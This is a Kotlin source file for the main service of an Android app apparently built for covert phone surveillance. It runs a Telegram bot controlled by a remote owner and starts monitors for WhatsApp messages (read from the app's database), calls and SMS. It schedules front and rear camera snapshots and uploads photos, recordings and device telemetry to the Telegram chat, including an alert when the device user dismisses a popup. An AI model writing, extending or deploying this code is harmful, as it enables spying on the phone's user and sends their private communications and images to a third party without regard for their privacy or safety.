package com.system.superiormonitor.bot

import com.system.superiormonitor.util.LogLevel

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.system.superiormonitor.bot.TelegramApi
import com.system.superiormonitor.data.PrefsManager
import com.system.superiormonitor.data.UpdateResponse
import com.system.superiormonitor.monitor.CallMonitor
import com.system.superiormonitor.monitor.NetworkEnforcer
import com.system.superiormonitor.monitor.SnapshotScheduler
import com.system.superiormonitor.monitor.WhatsAppMonitor
import com.system.superiormonitor.monitor.SmsMonitor

import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import com.system.superiormonitor.util.TelemetryCollector
import kotlinx.coroutines.*
import java.io.File
import java.io.IOException
import java.net.UnknownHostException

/**
 * Foreground service that runs the Telegram bot polling loop and
 * orchestrates all monitor sub-systems (WhatsApp, Calls, Network, Snapshots).
 *
 * Refactored from the original TelegramBotService:
 * - All HTTP calls delegated to [TelegramApi] (was inline with duplicate OkHttpClient)
 * - All command/callback handling delegated to [BotCommands] (was split across 5 files)
 * - Monitor lifecycle management unchanged
 */
class BotService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var prefsManager: PrefsManager? = null
    private var botCommands: BotCommands? = null
    private var networkEnforcer: NetworkEnforcer? = null

    private var lastUpdateId: Long = 0
    private val startTime = System.currentTimeMillis() / 1000L
    private var hasSentBootMessage = false
    private var isFromBoot = false

    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var pollingJob: Job? = null
    private var whatsAppMonitor: WhatsAppMonitor? = null
    private var callMonitor: CallMonitor? = null
    private var smsMonitor: SmsMonitor? = null

    private val unauthorizedAccessAttempts = object : java.util.LinkedHashMap<String, Int>(50, 0.75f, true) {
        override fun removeEldestEntry(eldest: MutableMap.MutableEntry<String, Int>?): Boolean {
            return size > 50
        }
    }

    companion object {
        const val CHANNEL_ID = "TelegramBotServiceChannel"
        const val NOTIFICATION_ID = 1
    }

    override fun onCreate() {
        super.onCreate()
        // DO NOT INITIALIZE NETWORK OR PREFS HERE to comply with Android 14+ strict requirements
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // MUST BE FIRST for Android 14+ compliance (fixes ForegroundServiceDidNotStartInTimeException)
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())

        // NOW SAFE TO INITIALIZE DEPENDENCIES (Fixes NullPointerException in dynamic handlers)
        if (prefsManager == null) prefsManager = PrefsManager.getInstance(this)
        if (botCommands == null) botCommands = BotCommands(this, serviceScope)

        val action = intent?.action
        if (action != null) {
            LogManager.log(LogCategory.SYSTEM, "BotService received intent action: $action")
        }

        // ── Dynamic feature toggle actions (no need to restart whole service) ──
        if (action == "ACTION_UPDATE_WHATSAPP") {
            handleWhatsAppToggle()
            return START_STICKY
        }
        if (action == "ACTION_UPDATE_CALL_ALERTS") {
            handleCallAlertsToggle()
            return START_STICKY
        }
        if (action == "ACTION_UPDATE_SMS_ALERTS") {
            handleSmsAlertsToggle()
            return START_STICKY
        }
        if (action == "ACTION_UPLOAD_RECORDING") {
            if (intent != null) handleUploadRecording(intent)
            return START_STICKY
        }
        if (action == "ACTION_UPLOAD_SNAPSHOT") {
            if (intent != null) handleUploadSnapshot(intent)
            return START_STICKY
        }
        if (action == "ACTION_POPUP_ACKNOWLEDGED") {
            serviceScope.launch(Dispatchers.IO) {
                val token = prefsManager?.botToken
                val chatId = prefsManager?.chatId
                if (!token.isNullOrBlank() && !chatId.isNullOrBlank()) {
                    TelegramApi.sendMessage(token, chatId, "✅ *The user has acknowledged and dismissed the popup on the device.*")
                }
            }
            return START_STICKY
        }

        // ── Full service startup (Only for null or unknown actions like boot/initial start) ──
        if (networkEnforcer == null) {
            networkEnforcer = NetworkEnforcer(this, prefsManager!!)
            networkEnforcer?.start()
        }

        LogManager.setServiceRunning(true)
        LogManager.log(LogCategory.SYSTEM, "Service Started")

        val currentPrefs = prefsManager
        if (currentPrefs == null || currentPrefs.botToken.isBlank() || currentPrefs.chatId.isBlank() || currentPrefs.ownerUserId.isBlank()) {
            LogManager.log(LogCategory.SYSTEM, "Error: Credentials are missing.", LogLevel.ERROR)
            stopSelf()
            return START_NOT_STICKY
        }

        // Start monitors if enabled
        startWhatsAppMonitorIfEnabled()
        startCallMonitorIfEnabled()
        startSmsMonitorIfEnabled()
        
        // Restore AlarmManager schedules (they are wiped by Android on reboot)
        LogManager.log(LogCategory.SYSTEM, "Restoring active camera schedules from persistent preferences...")
        val scheduler = SnapshotScheduler(this)
        if (prefsManager?.enableSnapshots == true) scheduler.scheduleNextSnapshot()
        if (prefsManager?.enableFrontCamera == true) scheduler.scheduleNextCamera(1)
        if (prefsManager?.enableRearCamera == true) scheduler.scheduleNextCamera(0)

        isFromBoot = intent?.getBooleanExtra("from_boot", false) == true

        registerNetworkCallback()

        return START_STICKY
    }

    // ═══════════════════════════════════════════════════════════
    //  DYNAMIC FEATURE TOGGLES
    // ═══════════════════════════════════════════════════════════

    private fun handleWhatsAppToggle() {
        if (prefsManager?.whatsappUpdatesEnabled == true) {
            if (whatsAppMonitor == null) {
                startWhatsAppMonitorIfEnabled()
                LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor dynamically started.")
            }
        } else {
            whatsAppMonitor?.stop()
            whatsAppMonitor = null
            LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor dynamically stopped.")
        }
    }

    private fun handleCallAlertsToggle() {
        if (prefsManager?.callAlertsEnabled == true) {
            if (callMonitor == null) {
                startCallMonitorIfEnabled()
                LogManager.log(LogCategory.SYSTEM, "Call Monitor dynamically started.")
            }
        } else {
            callMonitor?.stop()
            callMonitor = null
            LogManager.log(LogCategory.SYSTEM, "Call Monitor dynamically stopped.")
        }
    }

    private fun handleSmsAlertsToggle() {
        if (prefsManager?.smsAlertsEnabled == true) {
            if (smsMonitor == null) {
                startSmsMonitorIfEnabled()
                LogManager.log(LogCategory.SYSTEM, "SMS Monitor dynamically started.")
            }
        } else {
            smsMonitor?.stop()
            smsMonitor = null
            LogManager.log(LogCategory.SYSTEM, "SMS Monitor dynamically stopped.")
        }
    }

    private fun handleUploadSnapshot(intent: Intent) {
        val filePath = intent.getStringExtra("filePath") ?: return
        val tag = intent.getStringExtra("tag") ?: "[SnapshotWorker]"
        val isSnapshot = intent.getBooleanExtra("isSnapshot", true)

        serviceScope.launch(Dispatchers.IO) {
            val file = File(filePath)
            if (!file.exists()) return@launch

            val token = prefsManager?.botToken ?: return@launch
            val chatId = prefsManager?.chatId ?: return@launch

            val messageText = if (isSnapshot) {
                BotMessages.MediaOps.buildSnapshotUploadMessage()
            } else {
                BotMessages.MediaOps.buildCameraUploadMessage(tag)
            }
            
            TelegramApi.sendMessage(token, chatId, messageText)
            delay(3000)

            if (TelegramApi.sendPhoto(token, chatId, file)) {
                file.delete()
                LogManager.log(LogCategory.SNAPSHOTS, "$tag Upload successful, local file deleted.")
            } else {
                LogManager.log(LogCategory.SNAPSHOTS, "$tag Upload failed. Moving to offline queue.", LogLevel.ERROR)
                try {
                    val dateFolder = file.parentFile?.parentFile
                    if (dateFolder != null) {
                        val offlineDir = File(dateFolder, "offline")
                        if (!offlineDir.exists()) offlineDir.mkdirs()
                        val offlineFile = File(offlineDir, file.name)
                        file.renameTo(offlineFile)
                    }
                } catch (e: Exception) {
                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Failed to move to offline: ${e.message}", LogLevel.ERROR)
                }
            }
        }
    }

    private fun handleUploadRecording(intent: Intent) {
        val fileUriString = intent.getStringExtra("fileUri") ?: return
        val originalPath = intent.getStringArrayExtra("originalPath") ?: emptyArray()
        val mimeType = intent.getStringExtra("mimeType") ?: "audio/mpeg"
        
        CoroutineScope(Dispatchers.IO).launch {
            val fileUri = android.net.Uri.parse(fileUriString)
            
            // Log what we received
            LogManager.log(LogCategory.SYSTEM, "Received recording for upload: ${originalPath.joinToString("/")}")
            
            var originalFileName = originalPath.lastOrNull() ?: "recording.opus"
            val extension = android.webkit.MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType)
            if (extension != null && !originalFileName.endsWith(".$extension")) {
                originalFileName = "$originalFileName.$extension"
            }
            
            val caption = BotMessages.MediaOps.buildNewRecordingUploadedMessage(originalFileName)
            
            if (TelegramApi.isApiReachable(this@BotService, prefsManager!!.botToken)) {
                // Upload via bot
                val result = TelegramApi.sendDocument(
                    botToken = prefsManager!!.botToken,
                    chatId = prefsManager!!.chatId,
                    context = this@BotService,
                    uri = fileUri,
                    mimeType = mimeType,
                    fileName = originalFileName,
                    caption = caption
                )
                
                if (result != null) {
                    LogManager.log(LogCategory.SYSTEM, "Successfully uploaded recording: ${originalPath.lastOrNull()}")
                    com.system.superiormonitor.bot.OfflineManager.moveRecordingToPermanent(this@BotService, fileUriString, originalPath, mimeType)
                } else {
                    LogManager.log(LogCategory.SYSTEM, "Failed to upload recording (API returned null). Left in offline.", LogLevel.ERROR)
                }
            } else {
                LogManager.log(LogCategory.SYSTEM, "Telegram unreachable. Left in offline for later sync.")
            }
        }
    }


    private fun startWhatsAppMonitorIfEnabled() {
        if (prefsManager?.whatsappUpdatesEnabled == true) {
            if (whatsAppMonitor == null) {
                // Fail-safe: Verify WhatsApp is installed and database is accessible
                if (!WhatsAppMonitor.isWhatsAppInstalled(this)) {
                    LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: WhatsApp is not installed. Disabling toggle.")
                    prefsManager?.whatsappUpdatesEnabled = false
                    return
                }
                val (dbAvailable, dbReason) = WhatsAppMonitor.checkWhatsAppDatabase()
                if (!dbAvailable) {
                    LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor: $dbReason. Disabling toggle.")
                    prefsManager?.whatsappUpdatesEnabled = false
                    return
                }

                whatsAppMonitor = WhatsAppMonitor(this) { text, parseMode: String? ->
                    val chatId = prefsManager?.chatId ?: return@WhatsAppMonitor
                    val token = prefsManager?.botToken ?: return@WhatsAppMonitor
                    TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
                }
                LogManager.log(LogCategory.SYSTEM, "WhatsApp Monitor initialized.")
            }
            whatsAppMonitor?.start(serviceScope)
        }
    }

    private fun startCallMonitorIfEnabled() {
        if (prefsManager?.callAlertsEnabled == true && callMonitor == null) {
            callMonitor = CallMonitor(this) { text, parseMode: String? ->
                val chatId = prefsManager?.chatId ?: return@CallMonitor
                val token = prefsManager?.botToken ?: return@CallMonitor
                TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
            }
            callMonitor?.start()
        }
    }

    private fun startSmsMonitorIfEnabled() {
        if (prefsManager?.smsAlertsEnabled == true) {
            if (smsMonitor == null) {
                smsMonitor = SmsMonitor(this) { text, parseMode: String? ->
                    val chatId = prefsManager?.chatId ?: return@SmsMonitor
                    val token = prefsManager?.botToken ?: return@SmsMonitor
                    TelegramApi.sendMessage(token, chatId, text, parseMode = parseMode)
                }
                smsMonitor?.start()
                LogManager.log(LogCategory.SYSTEM, "SMS Monitor started.")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  NETWORK RECOVERY
    // ═══════════════════════════════════════════════════════════

    private fun registerNetworkCallback() {
        if (networkCallback != null) return

        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                // Instantly resume WhatsApp Monitor to catch the reconnect message flood
                startWhatsAppMonitorIfEnabled()

                if (pollingJob?.isActive != true) {
                    LogManager.log(LogCategory.SYSTEM, "Network connection detected. Initiating recovery sequence...")
                    pollingJob?.cancel()
                    pollingJob = serviceScope.launch(Dispatchers.IO) {
                        val token = prefsManager?.botToken
                        if (token != null) {
                            LogManager.log(LogCategory.SYSTEM, "Checking Telegram API reachability...")
                            var attempts = 0
                            while (TelegramApi.getMe(token) == null) {
                                attempts++
                                if (attempts > 30) { // 60 seconds max wait
                                    LogManager.log(LogCategory.SYSTEM, "[System] Telegram API unreachable. Returning to deep sleep.")
                                    return@launch
                                }
                                delay(2000)
                            }
                            LogManager.log(LogCategory.SYSTEM, "Telegram API is reachable!")
                        }

                        LogManager.log(LogCategory.SYSTEM, "Waiting 10 seconds for network stabilization...")
                        delay(10000)

                        if (!resolveDnsWithRetries("api.telegram.org")) {
                            LogManager.log(LogCategory.SYSTEM, "[System] DNS resolution failed after 3 retries. Returning to deep sleep.", LogLevel.ERROR)
                            return@launch
                        }

                        LogManager.log(LogCategory.SYSTEM, "DNS resolved. Connection restored. Resuming Telegram polling loop.")
                        TelegramApi.evictConnections()

                        sendConnectionRestoredNotification()
                        startPollingLoop()
                    }
                }
            }

            override fun onLost(network: Network) {
                LogManager.log(LogCategory.SYSTEM, "[System] Network offline. Deep sleep mode active.")
                
                // Suspend WhatsApp Monitor to save battery
                whatsAppMonitor?.stop()

                pollingJob?.cancel()
                pollingJob = null
            }
        }
        connectivityManager.registerDefaultNetworkCallback(networkCallback!!)
    }

    private suspend fun sendConnectionRestoredNotification() {
        val chatId = prefsManager?.chatId ?: return
        val token = prefsManager?.botToken ?: return

        val telemetry = TelemetryCollector.gatherTelemetry()
        val title = BotMessages.Alerts.buildConnectionRestoredMessage()
        val msg = BotMessages.Core.buildTelemetryMessage(title, telemetry)
        TelegramApi.sendMessage(token, chatId, msg)

        // Check for offline files using centralized helper
        com.system.superiormonitor.bot.OfflineManager.processOfflineQueue(this, serviceScope, chatId, null, token)
    }

    // ═══════════════════════════════════════════════════════════
    //  POLLING LOOP
    // ═══════════════════════════════════════════════════════════

    private suspend fun resolveDnsWithRetries(host: String): Boolean {
        var delayMs = 5000L
        while (currentCoroutineContext().isActive && networkCallback != null) {
            try {
                withContext(Dispatchers.IO) {
                    java.net.InetAddress.getByName(host)
                }
                return true
            } catch (e: Exception) {
                LogManager.log(LogCategory.SYSTEM, "DNS resolution failed. Retrying in ${delayMs / 1000}s...", LogLevel.ERROR)
                delay(delayMs)
                if (delayMs < 60000L) delayMs *= 2 // Exponential backoff up to 60s
            }
        }
        return false
    }

    private suspend fun startPollingLoop() {
        LogManager.log(LogCategory.SYSTEM, "Polling loop started...")
        val currentPrefs = prefsManager ?: return

        // Fetch bot username for strict command routing with retry
        var meResponse = TelegramApi.getMe(currentPrefs.botToken)
        while (meResponse?.ok != true && currentCoroutineContext().isActive) {
            LogManager.log(LogCategory.SYSTEM, "Failed to resolve bot identity. Retrying in 5s...", LogLevel.ERROR)
            delay(5000)
            meResponse = TelegramApi.getMe(currentPrefs.botToken)
        }
        botCommands?.setBotUsername(meResponse?.result?.username)

        while (currentCoroutineContext().isActive) {
            try {
                val offset = lastUpdateId + 1
                val response = TelegramApi.getUpdatesRaw(currentPrefs.botToken, offset)

                // If we get any HTTP response, the API is reachable
                LogManager.setTelegramApiReachable(true)

                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    if (responseBody != null) {
                        val updateResponse = TelegramApi.json.decodeFromString<UpdateResponse>(responseBody)
                        if (updateResponse.ok) {
                            if (isFromBoot && !hasSentBootMessage) {
                                hasSentBootMessage = true
                                val telemetry = TelemetryCollector.gatherTelemetry()
                                val title = BotMessages.Alerts.buildRebootMessage()
                                val msg = BotMessages.Core.buildTelemetryMessage(title, telemetry)
                                TelegramApi.sendMessage(currentPrefs.botToken, currentPrefs.chatId, msg)
                            }
                            for (update in updateResponse.result) {
                                lastUpdateId = update.update_id
                                handleUpdate(update)
                            }
                            if (updateResponse.result.isEmpty()) {
                                delay(500) // Prevent tight spin-loop
                            }
                        }
                    }
                } else {
                    val errorBody = response.body?.string()
                    LogManager.log(LogCategory.SYSTEM, "HTTP Error: ${response.code} - Body: $errorBody", LogLevel.ERROR)
                    delay(2000)
                }
            } catch (e: Exception) {
                LogManager.setTelegramApiReachable(false)
                if (e is IOException || e is UnknownHostException) {
                    LogManager.log(LogCategory.SYSTEM, "[Network] Transient socket issue detected...")
                } else {
                    LogManager.log(LogCategory.SYSTEM, "Error: ${e.message}", LogLevel.ERROR)
                    Log.e("BotService", "Error in polling loop", e)
                }
                delay(5000)
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  UPDATE HANDLING & AUTH
    // ═══════════════════════════════════════════════════════════

    private fun handleUpdate(update: com.system.superiormonitor.data.Update) {
        val incomingChatId: String
        val incomingUserId: String

        if (update.message != null) {
            if (update.message.date < startTime) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Ignoring old message from before service startup.")
                return
            }
            incomingChatId = update.message.chat.id.toString()
            incomingUserId = update.message.from?.id?.toString() ?: ""
        } else if (update.callback_query != null) {
            val cbMsg = update.callback_query.message
            if (cbMsg != null && cbMsg.date < startTime) {
                LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Ignoring old callback query from menu sent before service startup.")
                return
            }
            incomingChatId = cbMsg?.chat?.id?.toString() ?: ""
            incomingUserId = update.callback_query.from.id.toString()
        } else if (update.my_chat_member != null) {
            incomingChatId = update.my_chat_member.chat.id.toString()
            incomingUserId = update.my_chat_member.from.id.toString()
        } else {
            return
        }

        val currentPrefs = prefsManager ?: return
        val isAuthorizedChat = incomingChatId == currentPrefs.chatId
        val isAuthorizedUser = incomingUserId == currentPrefs.ownerUserId

        if (!isAuthorizedChat && !isAuthorizedUser) {
            BotActions.handleUnauthorizedAccess(this, serviceScope, update, incomingUserId, incomingChatId, unauthorizedAccessAttempts)
            return
        }

        if (update.message?.text != null) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Received command: ${update.message.text}")
        } else if (update.callback_query != null) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] User selected action: ${update.callback_query.data}")
        } else if (update.message?.photo != null || update.message?.video != null || update.message?.audio != null || update.message?.document != null) {
            LogManager.log(LogCategory.BOT_ACTIVITY, "[RECEIVE] Received media attachment")
        }

        val commands = botCommands ?: return
        val responsePayload = commands.routeUpdate(update)

        if (responsePayload != null && incomingChatId.isNotBlank()) {
            serviceScope.launch(Dispatchers.IO) {
                if (responsePayload.contains("JSON_MARKUP:")) {
                    val parts = responsePayload.split("JSON_MARKUP:", limit = 2)
                    val textPart = parts[0].trim()
                    val markupPart = parts[1].trim()
                    val msgId = TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, textPart, replyMarkup = markupPart)
                    if (msgId != null) {
                        commands.scheduleAutoDelete(incomingChatId, msgId, currentPrefs.botToken)
                    }
                } else {
                    TelegramApi.sendMessage(currentPrefs.botToken, incomingChatId, responsePayload)
                }
            }
        }
    }


    // ═══════════════════════════════════════════════════════════
    //  LIFECYCLE
    // ═══════════════════════════════════════════════════════════

    override fun onDestroy() {
        super.onDestroy()
        whatsAppMonitor?.stop()
        whatsAppMonitor = null
        callMonitor?.stop()
        callMonitor = null
        smsMonitor?.stop()
        smsMonitor = null
        TelegramApi.cancelAll()
        pollingJob?.cancel()
        serviceJob.cancel()
        networkEnforcer?.stop()

        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        networkCallback?.let { connectivityManager.unregisterNetworkCallback(it) }

        LogManager.setServiceRunning(false)
        LogManager.log(LogCategory.SYSTEM, "Service Stopped")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "SuperiorMonitor Background Service",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Superior Monitor Active")
            .setContentText("Monitoring system events and bot queries...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
    }
}
